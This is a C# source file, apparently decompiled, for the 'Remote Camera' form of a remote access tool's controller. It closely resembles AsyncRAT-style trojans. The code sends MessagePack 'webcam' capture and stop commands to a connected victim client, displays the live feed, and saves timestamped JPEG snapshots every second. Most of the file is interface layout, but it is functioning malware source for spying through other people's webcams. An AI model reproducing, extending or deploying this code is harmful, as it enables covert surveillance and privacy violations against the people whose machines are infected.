using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using DevExpress.Utils;
using DevExpress.Utils.Svg;
using DevExpress.XtraEditors;
using DevExpress.XtraEditors.Controls;
using DevExpress.XtraTab;
using MessagePackLib.MessagePack;
using Server.Connection;

namespace Server.Forms;

public class FormWebcam : XtraForm
{
	public Stopwatch sw = Stopwatch.StartNew();

	public int FPS;

	public bool SaveIt;

	private IContainer components;

	public PictureBox pictureBox1;

	public System.Windows.Forms.Timer timer1;

	private System.Windows.Forms.Timer timerSave;

	public Label labelWait;

	private Label label1;

	public SpinEdit numericUpDown1;

	public ComboBoxEdit comboBox1;

	public SimpleButton button1;

	public SimpleButton btnSave;

	private PanelControl panelControl1;

	private XtraTabControl xtraTabControl2;

	private XtraTabPage xtraTabPage2;

	public FormMain F { get; set; }

	internal Clients Client { get; set; }

	internal Clients ParentClient { get; set; }

	public string FullPath { get; set; }

	public Image GetImage { get; set; }

	public FormWebcam()
	{
		InitializeComponent();
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		try
		{
			if (button1.Tag == "play")
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "webcam";
				msgPack.ForcePathObject("Command").AsString = "capture";
				msgPack.ForcePathObject("List").AsInteger = comboBox1.SelectedIndex;
				msgPack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(numericUpDown1.Value);
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
				button1.Tag = "stop";
				numericUpDown1.Enabled = false;
				comboBox1.Enabled = false;
				btnSave.Enabled = true;
			}
			else
			{
				button1.Tag = "play";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "webcam";
				msgPack2.ForcePathObject("Command").AsString = "stop";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
				numericUpDown1.Enabled = true;
				comboBox1.Enabled = true;
				btnSave.Enabled = false;
				timerSave.Stop();
			}
		}
		catch
		{
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected)
			{
				timer1.Stop();
				Close();
			}
		}
		catch
		{
			Close();
		}
	}

	private void FormWebcam_FormClosed(object sender, FormClosedEventArgs e)
	{
		try
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				Client?.Disconnected();
			});
		}
		catch
		{
		}
	}

	private void BtnSave_Click(object sender, EventArgs e)
	{
		if (button1.Tag != "stop")
		{
			return;
		}
		if (SaveIt)
		{
			SaveIt = false;
			return;
		}
		try
		{
			if (!Directory.Exists(FullPath))
			{
				Directory.CreateDirectory(FullPath);
			}
			Process.Start(FullPath);
		}
		catch
		{
		}
		SaveIt = true;
	}

	private void TimerSave_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!Directory.Exists(FullPath))
			{
				Directory.CreateDirectory(FullPath);
			}
			pictureBox1.Image.Save(FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", ImageFormat.Jpeg);
		}
		catch
		{
		}
	}

	private void FormWebcam_Load(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormWebcam));
		this.btnSave = new DevExpress.XtraEditors.SimpleButton();
		this.button1 = new DevExpress.XtraEditors.SimpleButton();
		this.comboBox1 = new DevExpress.XtraEditors.ComboBoxEdit();
		this.numericUpDown1 = new DevExpress.XtraEditors.SpinEdit();
		this.label1 = new System.Windows.Forms.Label();
		this.pictureBox1 = new System.Windows.Forms.PictureBox();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.timerSave = new System.Windows.Forms.Timer(this.components);
		this.labelWait = new System.Windows.Forms.Label();
		this.panelControl1 = new DevExpress.XtraEditors.PanelControl();
		this.xtraTabControl2 = new DevExpress.XtraTab.XtraTabControl();
		this.xtraTabPage2 = new DevExpress.XtraTab.XtraTabPage();
		((System.ComponentModel.ISupportInitialize)this.comboBox1.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numericUpDown1.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.panelControl1).BeginInit();
		this.panelControl1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl2).BeginInit();
		this.xtraTabControl2.SuspendLayout();
		this.xtraTabPage2.SuspendLayout();
		base.SuspendLayout();
		this.btnSave.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("btnSave.ImageOptions.Image");
		this.btnSave.ImageOptions.Location = DevExpress.XtraEditors.ImageLocation.MiddleCenter;
		this.btnSave.ImageOptions.SvgImageColorizationMode = DevExpress.Utils.SvgImageColorizationMode.CommonPalette;
		this.btnSave.ImageOptions.SvgImageSize = new System.Drawing.Size(25, 25);
		this.btnSave.Location = new System.Drawing.Point(323, 4);
		this.btnSave.Name = "btnSave";
		this.btnSave.Size = new System.Drawing.Size(30, 30);
		this.btnSave.TabIndex = 123;
		this.btnSave.Text = "OK";
		this.btnSave.Click += new System.EventHandler(BtnSave_Click);
		this.button1.ImageOptions.Location = DevExpress.XtraEditors.ImageLocation.MiddleCenter;
		this.button1.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("button1.ImageOptions.SvgImage");
		this.button1.ImageOptions.SvgImageColorizationMode = DevExpress.Utils.SvgImageColorizationMode.CommonPalette;
		this.button1.ImageOptions.SvgImageSize = new System.Drawing.Size(25, 25);
		this.button1.Location = new System.Drawing.Point(274, 4);
		this.button1.Name = "button1";
		this.button1.Size = new System.Drawing.Size(30, 30);
		this.button1.TabIndex = 122;
		this.button1.Text = "OK";
		this.button1.Click += new System.EventHandler(Button1_Click);
		this.comboBox1.Location = new System.Drawing.Point(106, 4);
		this.comboBox1.Name = "comboBox1";
		this.comboBox1.Properties.Buttons.AddRange(new DevExpress.XtraEditors.Controls.EditorButton[1]
		{
			new DevExpress.XtraEditors.Controls.EditorButton(DevExpress.XtraEditors.Controls.ButtonPredefines.Combo)
		});
		this.comboBox1.Size = new System.Drawing.Size(149, 30);
		this.comboBox1.TabIndex = 9;
		this.numericUpDown1.EditValue = new decimal(new int[4] { 50, 0, 0, 0 });
		this.numericUpDown1.Location = new System.Drawing.Point(43, 4);
		this.numericUpDown1.Name = "numericUpDown1";
		this.numericUpDown1.Properties.Buttons.AddRange(new DevExpress.XtraEditors.Controls.EditorButton[1]
		{
			new DevExpress.XtraEditors.Controls.EditorButton(DevExpress.XtraEditors.Controls.ButtonPredefines.Combo)
		});
		this.numericUpDown1.Size = new System.Drawing.Size(57, 30);
		this.numericUpDown1.TabIndex = 7;
		this.label1.AutoSize = true;
		this.label1.Location = new System.Drawing.Point(4, 11);
		this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(35, 16);
		this.label1.TabIndex = 8;
		this.label1.Text = "FPS:";
		this.pictureBox1.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
		this.pictureBox1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.pictureBox1.Location = new System.Drawing.Point(0, 0);
		this.pictureBox1.Margin = new System.Windows.Forms.Padding(2);
		this.pictureBox1.Name = "pictureBox1";
		this.pictureBox1.Size = new System.Drawing.Size(615, 409);
		this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.pictureBox1.TabIndex = 5;
		this.pictureBox1.TabStop = false;
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(Timer1_Tick);
		this.timerSave.Interval = 1000;
		this.timerSave.Tick += new System.EventHandler(TimerSave_Tick);
		this.labelWait.AutoSize = true;
		this.labelWait.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.labelWait.Location = new System.Drawing.Point(221, 188);
		this.labelWait.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.labelWait.Name = "labelWait";
		this.labelWait.Size = new System.Drawing.Size(101, 20);
		this.labelWait.TabIndex = 6;
		this.labelWait.Text = "Please wait...";
		this.panelControl1.Controls.Add(this.btnSave);
		this.panelControl1.Controls.Add(this.label1);
		this.panelControl1.Controls.Add(this.button1);
		this.panelControl1.Controls.Add(this.numericUpDown1);
		this.panelControl1.Controls.Add(this.comboBox1);
		this.panelControl1.Dock = System.Windows.Forms.DockStyle.Top;
		this.panelControl1.Location = new System.Drawing.Point(0, 0);
		this.panelControl1.Name = "panelControl1";
		this.panelControl1.Size = new System.Drawing.Size(615, 38);
		this.panelControl1.TabIndex = 7;
		this.xtraTabControl2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.xtraTabControl2.Location = new System.Drawing.Point(0, 0);
		this.xtraTabControl2.MultiLine = DevExpress.Utils.DefaultBoolean.True;
		this.xtraTabControl2.Name = "xtraTabControl2";
		this.xtraTabControl2.SelectedTabPage = this.xtraTabPage2;
		this.xtraTabControl2.Size = new System.Drawing.Size(617, 440);
		this.xtraTabControl2.TabIndex = 11;
		this.xtraTabControl2.TabPages.AddRange(new DevExpress.XtraTab.XtraTabPage[1] { this.xtraTabPage2 });
		this.xtraTabPage2.Controls.Add(this.panelControl1);
		this.xtraTabPage2.Controls.Add(this.labelWait);
		this.xtraTabPage2.Controls.Add(this.pictureBox1);
		this.xtraTabPage2.Name = "xtraTabPage2";
		this.xtraTabPage2.Size = new System.Drawing.Size(615, 409);
		base.AutoScaleDimensions = new System.Drawing.SizeF(7f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(617, 440);
		base.Controls.Add(this.xtraTabControl2);
		base.IconOptions.Icon = (System.Drawing.Icon)resources.GetObject("FormWebcam.IconOptions.Icon");
		base.IconOptions.Image = (System.Drawing.Image)resources.GetObject("FormWebcam.IconOptions.Image");
		base.Margin = new System.Windows.Forms.Padding(2);
		base.Name = "FormWebcam";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Remote Camera";
		base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormWebcam_FormClosed);
		base.Load += new System.EventHandler(FormWebcam_Load);
		((System.ComponentModel.ISupportInitialize)this.comboBox1.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numericUpDown1.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
		((System.ComponentModel.ISupportInitialize)this.panelControl1).EndInit();
		this.panelControl1.ResumeLayout(false);
		this.panelControl1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl2).EndInit();
		this.xtraTabControl2.ResumeLayout(false);
		this.xtraTabPage2.ResumeLayout(false);
		this.xtraTabPage2.PerformLayout();
		base.ResumeLayout(false);
	}
}
